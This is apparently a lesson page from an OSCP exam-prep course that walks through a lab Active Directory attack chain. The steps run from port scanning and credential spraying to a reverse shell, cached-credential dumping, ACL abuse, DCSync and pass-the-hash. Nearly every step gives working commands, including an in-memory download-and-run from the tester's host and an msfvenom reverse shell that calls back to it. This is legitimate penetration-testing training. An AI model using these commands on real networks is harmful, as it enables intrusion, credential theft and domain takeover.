
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 42 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_10

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/550439)[About this chain](https://hackerblueprint.com/labs#chain-10)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2010%3A%20Replicant)

Tags

Port ScanningSMB EnumerationAD EnumerationPassword ReuseOSCP® Exam StrategyKerberoastingAS-REP RoastingDCSync

PreviousCompletedNext: Chain 11: Cold StorageContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 10: Replicant

Step 1 of 12

Close

0:00 / 1:13:50

Auto

1

Sweep and scan the subnet

BackNext step

Your lab addressesTarget IPDC IPYour IP

1. 1Sweep and scan the subnet_0:00_
    
    You begin with a ping sweep of the lab subnet to find live hosts, then feed those addresses into a full TCP port scan with default scripts and version detection. A ping sweep (`-sn`) sends no port probes, it only checks which hosts answer. The full scan then covers every TCP port so nothing is missed.
    
    Rescanning later is worth it if you get stuck, because lab infrastructure can be unstable in the same way exam infrastructure sometimes is.
    
    ```
    nmap -sn TARGET_IP/24
    ```
    
    Copy
    
    A ping sweep of the lab /24 range. `-sn` means no port scan, so it only lists which hosts are alive. Put any address in your lab range where TARGET_IP is.
    
    ```
    nmap -p- -sC -sV --open -iL ips.txt -oN nmap.log
    ```
    
    Copy
    
    A full TCP scan of the live hosts listed in `ips.txt`. `-p-` scans all 65535 ports, `-sC` runs the default scripts, `-sV` gets service versions, `--open` shows only open ports and `-oN` saves the output to `nmap.log`.
    
    **Tip**Save the discovered addresses to a file like `ips.txt` so you can pass the whole list to later tools with one flag.
    
2. 2Collect BloodHound data and find the DC_1:52_
    
    While the port scan runs you collect Active Directory data with BloodHound, a tool that maps users, groups and the permissions between them into a graph. You point the collector at the domain controller as the DNS server, since Active Directory relies on DNS, and feed it the starting credentials.
    
    Reviewing the scan you identify `DC_IP` as the domain controller from its Kerberos (88), LDAP (389) and DNS (53) ports, while the two clients have RDP and WinRM open and no RDP on the DC. Knowing each host's role tells you where to spend effort. You then load the collected data into BloodHound in the browser at `localhost:8080`.
    
    ```
    bloodhound-python -d hackerblueprint.local -u hclarke -p Cuba-libre72 -ns DC_IP -c All
    ```
    
    Copy
    
    Collects Active Directory data as hclarke. `-d` is the domain, `-ns` is the DNS server (the DC, since Active Directory depends on DNS) and `-c All` runs every collection method. The resulting JSON files are uploaded into BloodHound.
    
    **Tip**The password BloodHound shows on first login is its own web interface password, not a domain credential. Do not confuse the two.
    
3. 3Find a shell by reusing the creds_8:07_
    
    You reuse the starting credentials across every open protocol before trying anything harder, because credential reuse is the cheapest route to a shell. netexec reports the login as valid on SMB, WinRM and RPC, but a valid login is not the same as a shell. Only RDP gives an interactive session, because hclarke is a member of Remote Desktop Users.
    
    You connect with xfreerdp, open PowerShell and run `whoami /all` to review hclarke's groups and privileges. Nothing there stands out, so local enumeration tools come next.
    
    ```
    netexec smb ips.txt -u hclarke -p Cuba-libre72
    ```
    
    Copy
    
    Tests the starting credentials over SMB against every host in `ips.txt`. A `Pwn3d` tag would mean admin access; a plain valid result means the login works but gives no shell.
    
    ```
    netexec winrm ips.txt -u hclarke -p Cuba-libre72
    ```
    
    Copy
    
    The same credential check over WinRM, the Windows remote management protocol. Here the login is valid but grants no session.
    
    ```
    netexec rdp ips.txt -u hclarke -p Cuba-libre72
    ```
    
    Copy
    
    Checks whether the credentials allow a Remote Desktop login. This is the one protocol that gives hclarke an interactive session.
    
    ```
    xfreerdp /v:TARGET_IP /u:hclarke /p:Cuba-libre72 /cert:ignore /dynamic-resolution
    ```
    
    Copy
    
    Opens an RDP session to the target. `/v` is the host, `/u` and `/p` are the credentials, `/cert:ignore` accepts the self-signed certificate and `/dynamic-resolution` lets the window resize.
    
    ```
    whoami /all
    ```
    
    Copy
    
    Run inside the RDP session, this lists the current user's groups, privileges and security identifiers so you can spot anything that helps you escalate.
    
    **Tip**A valid login and a shell are different things. netexec can show a credential as valid on SMB or WinRM while only RDP lets that user run commands.
    
4. 4Map the domain in BloodHound_10:15_
    
    With a foothold you review the graph. You mark hclarke as owned so BloodHound can draw attack paths that start from the accounts you control. The owned marker is unreliable in this version: if the skull icon does not stick, the shortest path from owned objects query returns nothing, so re-mark the account until the skull holds.
    
    You run the usual checks: Domain Admins, Kerberoastable users (accounts whose service tickets can be cracked offline), AS-REP roastable users, DCSync rights and the Guest account. Nothing interesting turns up for hclarke beyond plain Domain Users membership, so the path forward is elsewhere.
    
    **Tip**Do not trust BloodHound until the owned skull appears and stays. A missing skull silently breaks the shortest-path queries and can cost you the box.
    
5. 5Enumerate for local privesc_16:41_
    
    Back on the host you look for a local privilege escalation. You host PowerUp, a PowerShell script that checks for common Windows misconfigurations, on a web server and pull it straight into memory with IEX, then run `Invoke-AllChecks`. It flags an unquoted service path, but you cannot write to the folder it points at, so that one is a false positive.
    
    You then run winPEAS, a broader enumeration tool, and send its output to a file. Searching the file for entries marked severity high points you at the real finding.
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Starts a simple web server in the current folder on your Kali box so the Windows target can download tools like PowerUp over HTTP.
    
    ```
    IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1'); Invoke-AllChecks
    ```
    
    Copy
    
    Downloads PowerUp into memory and runs all of its privilege checks. `IEX` executes the downloaded text without writing a file to disk, which is quieter.
    
    ```
    winPEAS.exe > winpeas.log
    ```
    
    Copy
    
    Runs winPEAS, a Windows enumeration tool, and redirects its long output to `winpeas.log` so you can read and search it afterwards.
    
    ```
    notepad winpeas.log
    ```
    
    Copy
    
    Opens the saved winPEAS output in Notepad over the RDP session. Search it for entries marked severity high to find the strongest findings.
    
    **Tip**An unquoted service path only matters if you can write to the folder it resolves to. Check your write access before chasing it, or you waste time on a false positive.
    
6. 6Weak registry ACL to SYSTEM_22:31_
    
    The winPEAS finding is a weak permission on a service's registry key. The BUILTIN\Interactive group, which every interactively logged-in user belongs to, has full control over the `applog` service key. `sc qc applog` confirms the service auto-starts and runs as SYSTEM.
    
    Because you can edit the key, you rewrite its `ImagePath` value (the path to the binary the service runs) to point at your own executable in `C:\Windows\Tasks\1.exe`. You build that executable with msfvenom, upload it, start a listener and reboot. On restart the service launches your payload as SYSTEM and you catch the shell.
    
    ```
    Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\applog" | Format-List
    ```
    
    Copy
    
    Shows the access control list on the applog service's registry key. You are looking for a group you belong to, such as BUILTIN\Interactive, holding FullControl.
    
    ```
    sc qc applog
    ```
    
    Copy
    
    Queries the applog service configuration. `qc` shows the start type (auto-start here) and the binary path, confirming the service runs automatically as SYSTEM.
    
    ```
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\applog" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Tasks\1.exe" /f
    ```
    
    Copy
    
    Rewrites the service's `ImagePath` so it runs your binary. `/v` names the value, `/t` sets its type, `/d` sets the new path and `/f` forces the change without a prompt.
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe -o 1.exe
    ```
    
    Copy
    
    Builds a Windows reverse shell executable. `LHOST` is your VPN address, `LPORT` is the port it connects back on, `-f exe` sets the output format and `-o` names the file.
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener for the reverse shell. `rlwrap` adds command history and line editing, which helps a lot with Windows shells; `nc -lvnp 443` listens on port 443.
    
    ```
    shutdown /r /t 0
    ```
    
    Copy
    
    Reboots the target immediately. On restart the auto-start applog service runs your binary as SYSTEM and connects back to your listener.
    
    **Tip**Use rlwrap for Windows reverse shells but not for Linux ones. On Linux the normal shell stabilisation steps fight rlwrap and break the session.
    
7. 7Dump and crack cached creds_30:21_
    
    As SYSTEM you add hclarke to the local Administrators group so you can dump credentials remotely with netexec, which now shows `Pwn3d` for hclarke. The SAM dump returns only local accounts, which are rarely useful across a domain.
    
    The LSA secrets dump is the prize. It holds cached domain credentials, the logons Windows stores so a user can sign in when the domain controller is unreachable. Here it reveals a hash for a new domain user, acooper. These are MS-Cache v2 (DCC2) hashes, which cannot be passed or relayed, so you crack it with John and the rockyou.txt wordlist.
    
    ```
    net localgroup administrators hclarke /add
    ```
    
    Copy
    
    Run from the SYSTEM shell, this adds hclarke to the local Administrators group so you can authenticate remotely with admin rights and dump credentials.
    
    ```
    netexec smb TARGET_IP -u hclarke -p Cuba-libre72 --lsa
    ```
    
    Copy
    
    Dumps LSA secrets from the host as the now-admin hclarke. `--lsa` includes cached domain logons; `--sam` would dump only the local SAM accounts.
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    
    Copy
    
    Cracks the cached MS-Cache v2 hash saved in the file `hash` using the rockyou.txt wordlist. John detects the DCC2 format on its own.
    
    **Tip**Cached domain credentials stay on a host after a reboot, so dump LSA secrets every time you reach SYSTEM, even if nobody is logged in right now.
    
8. 8Spray acooper and read its edges_36:50_
    
    You build a list of every domain user and spray the two passwords you now hold across all hosts and protocols, using `--continue-on-success` so netexec keeps going after the first hit. Only hclarke and acooper come back valid, so there is no wider password reuse. acooper gives no shell on WinRM or RDP, so you turn to its permissions.
    
    You mark acooper as owned in BloodHound and find it holds outbound object control, meaning it can act on another object. The edge is a WriteOwner over a user called pmorris. This is where the chain shifts from local escalation to abusing Active Directory permissions.
    
    ```
    netexec smb ips.txt -u users.txt -p creds.txt --continue-on-success
    ```
    
    Copy
    
    Sprays every username in `users.txt` against every password in `creds.txt` over SMB on all hosts. `--continue-on-success` stops it halting at the first valid pair so you see them all.
    
    ```
    netexec winrm ips.txt -u acooper -p creds.txt
    ```
    
    Copy
    
    Checks whether acooper can get a WinRM shell on any host. Here it cannot, which pushes you toward abusing acooper's permissions instead.
    
    **Tip**Re-mark each new account as owned in BloodHound. Each owned account can expose fresh outbound control edges that the graph did not show before.
    
9. 9Abuse WriteOwner to reset pmorris_45:14_
    
    BloodHound shows acooper can take ownership of pmorris. You make acooper the owner of the pmorris object with impacket-owneredit, then use that ownership to grant acooper full control over pmorris with impacket-dacledit. With full control, the cleanest move is to force a new password rather than try to crack a hash you might never recover.
    
    You reset pmorris's password to `babygirl` and confirm the new credential works with a netexec SMB check against the domain controller. Each impacket tool needs `-dc-ip` so it can reach the controller, otherwise it fails with an invalid server status error.
    
    ```
    impacket-owneredit -action write -new-owner acooper -target pmorris 'hackerblueprint.local/acooper:BabyGirl#1' -dc-ip DC_IP
    ```
    
    Copy
    
    Makes acooper the owner of the pmorris object. `-new-owner` is the account taking ownership, `-target` is the victim and `-dc-ip` points the tool at the domain controller. Use acooper's own cracked password here.
    
    ```
    impacket-dacledit -action write -rights FullControl -principal acooper -target pmorris 'hackerblueprint.local/acooper:BabyGirl#1' -dc-ip DC_IP
    ```
    
    Copy
    
    Uses the new ownership to grant acooper full control over pmorris. `-rights FullControl` is the permission added, `-principal` is who receives it and `-target` is the object.
    
    ```
    netexec smb DC_IP -u pmorris -p babygirl
    ```
    
    Copy
    
    Confirms the reset worked by authenticating as pmorris with the new password against the domain controller over SMB.
    
    **Tip**WriteOwner chains into full control: take ownership, grant yourself FullControl, then force a password change. A reset gives sure access where cracking a hash does not.
    
10. 10Shell on Client1 and SeDebugPrivilege_53:42_
    
    pmorris's new password opens a WinRM shell on Client1 through evil-winrm. The token holds `SeDebugPrivilege`, a privilege that lets you open and inject into any process, including ones running as SYSTEM.
    
    You list processes and inject a reverse shell into a SYSTEM-owned process. The first attempts against processes like smss and conhost fail with error 5 (access denied), but a reliable target such as winlogon or lsass works and you land a shell as NT AUTHORITY\SYSTEM. As SYSTEM you add pmorris to the local Administrators group, dump LSA secrets again, find a cached hash for lwallis and crack it with John.
    
    ```
    netexec winrm TARGET_IP -u pmorris -p babygirl
    ```
    
    Copy
    
    Rechecks the protocols for the new pmorris credentials and finds WinRM open on Client1, which will give a shell.
    
    ```
    evil-winrm -i TARGET_IP -u pmorris -p babygirl
    ```
    
    Copy
    
    Opens an interactive WinRM shell on Client1 as pmorris. `-i` is the target host; evil-winrm is the standard client for WinRM sessions.
    
    ```
    net localgroup administrators pmorris /add
    ```
    
    Copy
    
    Run from the SYSTEM shell gained through SeDebugPrivilege, this makes pmorris a local administrator so you can dump credentials remotely.
    
    ```
    netexec smb TARGET_IP -u pmorris -p babygirl --lsa
    ```
    
    Copy
    
    Dumps LSA secrets from Client1, revealing another cached domain credential, this time for lwallis.
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash2
    ```
    
    Copy
    
    Cracks the new cached hash in `hash2` with rockyou.txt to recover lwallis's plaintext password.
    
    **Tip**SeDebugPrivilege lets you inject into a SYSTEM process for a direct shell, so you avoid dumping LSASS. Pick a stable target: smss and some protected processes fail with error 5.
    
11. 11Clear the remaining checks_1:03:07_
    
    Before the final move you clear the rest of the checklist, because thorough enumeration is what the exam rewards. You run Certipy to look for an Active Directory Certificate Services server and find none, so no certificate attacks apply.
    
    You list and download the SMB shares across every host, including the domain controller, and find only default Group Policy `.pol` files with no stored passwords. These are dead ends, but confirming them rules out whole classes of attack and tells you the real path is the permission you already found.
    
    ```
    certipy find -u hclarke@hackerblueprint.local -p Cuba-libre72 -dc-ip DC_IP
    ```
    
    Copy
    
    Searches for an Active Directory Certificate Services server and vulnerable templates. Here it finds no certificate authority, so certificate attacks do not apply.
    
    ```
    netexec smb TARGET_IP -u pmorris -p babygirl --shares
    ```
    
    Copy
    
    Lists the SMB shares the account can see on a host and the read or write access it has to each one. Check every host, including the DC.
    
    ```
    netexec smb TARGET_IP -u pmorris -p babygirl -M spider_plus -o DOWNLOAD_FLAG=True
    ```
    
    Copy
    
    Runs the spider_plus module to walk the shares and, with DOWNLOAD_FLAG set to True, downloads their files for review. Here they are only default Group Policy files.
    
    **Tip**Run the share and Certipy checks for every new account you get, since read and write access differs per user. A share named something like finance or public can hint at an NTLM relay path.
    
12. 12WriteDacl to DCSync and own the domain_1:09:44_
    
    You mark lwallis as owned and BloodHound reveals the final edge: lwallis holds WriteDacl over the domain object itself, meaning it can edit the domain's permissions. You use impacket-dacledit to grant lwallis DCSync rights, the replication permission that lets an account pull password hashes from the domain controller.
    
    impacket-secretsdump then performs the DCSync and dumps every account's hash. You take the Administrator NTLM hash and log in with impacket-psexec using pass-the-hash, landing a SYSTEM shell on the domain controller. The whole domain falls through permissions alone.
    
    ```
    impacket-dacledit -action write -rights DCSync -principal lwallis -target-dn 'DC=hackerblueprint,DC=local' 'hackerblueprint.local/lwallis:Frankie7!' -dc-ip DC_IP
    ```
    
    Copy
    
    Uses lwallis's WriteDacl over the domain to grant lwallis the DCSync right. `-rights DCSync` adds the replication permission and `-target-dn` is the domain object's distinguished name.
    
    ```
    impacket-secretsdump 'hackerblueprint.local/lwallis:Frankie7!'@DC_IP
    ```
    
    Copy
    
    Performs a DCSync with lwallis's new rights and dumps every domain account's NTLM hash from the domain controller, including Administrator.
    
    ```
    impacket-psexec 'hackerblueprint.local/administrator'@DC_IP -hashes :NTLM_HASH
    ```
    
    Copy
    
    Logs in as Administrator using pass-the-hash. `-hashes :NTLM_HASH` supplies the NTLM hash in place of a password, with the LM half left empty, giving a SYSTEM shell on the DC.
    
    **Tip**WriteDacl over the domain object is game over: grant yourself DCSync, dump every hash, then pass-the-hash as Administrator onto the domain controller.

